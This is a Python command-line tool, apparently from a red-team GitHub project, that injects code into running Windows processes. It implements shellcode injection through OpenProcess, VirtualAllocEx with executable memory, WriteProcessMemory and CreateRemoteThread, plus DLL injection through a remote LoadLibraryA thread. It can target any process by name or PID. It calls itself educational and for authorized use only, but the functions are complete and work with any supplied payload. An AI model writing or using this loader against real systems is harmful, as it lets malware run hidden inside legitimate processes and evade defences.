#!/usr/bin/env python3
"""
Process Inject — Windows Process Injection Technique Demonstrator
Demonstrates classic injection techniques: shellcode injection, DLL injection path building.
This is a demonstration/educational tool — no shellcode is bundled.
Author: Omar Khalid (amooryx) | github.com/amooryx/process-inject
AUTHORIZED USE ONLY — for authorized red team engagements and security research.
"""

import argparse
import ctypes
import json
import os
import platform
import subprocess
import sys

IS_WIN = platform.system() == "Windows"

if IS_WIN:
    import ctypes.wintypes

# Windows API constants
PROCESS_ALL_ACCESS       = 0x1F0FFF
MEM_COMMIT               = 0x1000
MEM_RESERVE              = 0x2000
PAGE_EXECUTE_READWRITE   = 0x40
PAGE_READWRITE           = 0x04

def list_processes() -> list[dict]:
    """List running processes (Windows)."""
    if not IS_WIN:
        out = subprocess.run("ps aux", shell=True, capture_output=True, text=True).stdout
        procs = []
        for line in out.splitlines()[1:]:
            parts = line.split(None, 10)
            if len(parts) >= 11:
                procs.append({"pid": parts[1], "name": parts[10][:50]})
        return procs
    procs = []
    try:
        out = subprocess.run("tasklist /fo csv /nh", shell=True,
                             capture_output=True, text=True).stdout
        for line in out.splitlines():
            parts = line.strip('"').split('","')
            if len(parts) >= 2:
                procs.append({"name": parts[0], "pid": parts[1]})
    except Exception:
        pass
    return procs

def find_process(name_or_pid: str) -> int | None:
    """Find a process by name or PID."""
    procs = list_processes()
    for p in procs:
        if p.get("name", "").lower() == name_or_pid.lower() or p.get("pid") == name_or_pid:
            try:
                return int(p["pid"])
            except Exception:
                pass
    try:
        return int(name_or_pid)
    except Exception:
        return None

def shellcode_inject_windows(pid: int, shellcode: bytes) -> dict:
    """
    Classic shellcode injection via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
    Demonstration skeleton — requires actual shellcode payload.
    """
    if not IS_WIN:
        return {"error": "Windows only"}
    k32 = ctypes.windll.kernel32

    h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return {"error": f"OpenProcess failed: {ctypes.GetLastError()}"}

    remote_mem = k32.VirtualAllocEx(h_process, None, len(shellcode),
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not remote_mem:
        k32.CloseHandle(h_process)
        return {"error": f"VirtualAllocEx failed: {ctypes.GetLastError()}"}

    written = ctypes.c_size_t(0)
    k32.WriteProcessMemory(h_process, remote_mem, shellcode, len(shellcode), ctypes.byref(written))

    thread_id = ctypes.c_ulong(0)
    h_thread = k32.CreateRemoteThread(h_process, None, 0,
                                      ctypes.c_void_p(remote_mem), None, 0,
                                      ctypes.byref(thread_id))
    k32.CloseHandle(h_process)
    if h_thread:
        k32.CloseHandle(h_thread)
        return {"success": True, "pid": pid, "remote_addr": hex(remote_mem),
                "bytes_written": written.value, "thread_id": thread_id.value}
    return {"error": f"CreateRemoteThread failed: {ctypes.GetLastError()}"}

def dll_inject_windows(pid: int, dll_path: str) -> dict:
    """DLL injection via LoadLibrary remote thread."""
    if not IS_WIN:
        return {"error": "Windows only"}
    k32    = ctypes.windll.kernel32
    dll_b  = dll_path.encode() + b"\x00"

    h_proc = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_proc:
        return {"error": f"OpenProcess failed: {ctypes.GetLastError()}"}

    remote_mem = k32.VirtualAllocEx(h_proc, None, len(dll_b),
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    ctypes.c_size_t(0)
    k32.WriteProcessMemory(h_proc, remote_mem, dll_b, len(dll_b), None)

    ll_addr = k32.GetProcAddress(k32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
    h_thread = k32.CreateRemoteThread(h_proc, None, 0, ll_addr,
                                      ctypes.c_void_p(remote_mem), 0, None)
    k32.CloseHandle(h_proc)
    if h_thread:
        k32.CloseHandle(h_thread)
        return {"success": True, "pid": pid, "dll": dll_path, "remote_addr": hex(remote_mem)}
    return {"error": f"CreateRemoteThread failed: {ctypes.GetLastError()}"}

def main():
    parser = argparse.ArgumentParser(
        description="Process Inject — Injection Technique Demonstrator (Authorized use only)",
    )
    subparsers = parser.add_subparsers(dest="cmd")

    list_p = subparsers.add_parser("list",    help="List running processes")
    list_p.add_argument("--filter", help="Filter by name")

    shell_p = subparsers.add_parser("shellcode", help="Shellcode injection (Windows)")
    shell_p.add_argument("pid",               help="Target PID or process name")
    shell_p.add_argument("--shellcode-file",  required=True, help="Binary shellcode file (.bin)")

    dll_p = subparsers.add_parser("dll",      help="DLL injection (Windows)")
    dll_p.add_argument("pid",                 help="Target PID or process name")
    dll_p.add_argument("--dll",               required=True, help="Path to DLL to inject")

    parser.add_argument("--out", help="Output JSON file")
    args = parser.parse_args()

    if not args.cmd:
        parser.print_help()
        sys.exit(1)

    result = {}
    print("[!] AUTHORIZED USE ONLY — for authorized red team engagements only")

    if args.cmd == "list":
        procs = list_processes()
        if args.filter:
            procs = [p for p in procs if args.filter.lower() in p.get("name", "").lower()]
        for p in procs:
            print(f"  PID={p.get('pid','?'):6s} {p.get('name','')}")
        result = {"processes": procs}

    elif args.cmd == "shellcode":
        pid = find_process(args.pid)
        if not pid:
            print(f"[!] Process not found: {args.pid}")
            sys.exit(1)
        with open(args.shellcode_file, "rb") as f:
            sc = f.read()
        print(f"[*] Injecting {len(sc)} bytes of shellcode into PID {pid} ...")
        result = shellcode_inject_windows(pid, sc)
        print(f"[+] Result: {result}")

    elif args.cmd == "dll":
        pid = find_process(args.pid)
        if not pid:
            print(f"[!] Process not found: {args.pid}")
            sys.exit(1)
        print(f"[*] DLL injection into PID {pid}: {args.dll}")
        result = dll_inject_windows(pid, os.path.abspath(args.dll))
        print(f"[+] Result: {result}")

    if hasattr(args, "out") and args.out:
        with open(args.out, "w") as f:
            json.dump(result, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
